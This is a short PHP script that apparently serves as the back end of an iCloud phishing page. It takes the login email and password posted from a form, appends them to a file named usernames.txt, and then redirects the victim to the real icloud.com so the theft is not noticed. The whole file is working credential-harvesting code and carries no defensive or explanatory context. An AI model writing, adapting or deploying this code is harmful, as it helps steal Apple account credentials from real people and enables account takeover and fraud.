<?php

file_put_contents("usernames.txt", "iCloud Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.icloud.com/');
exit();
?>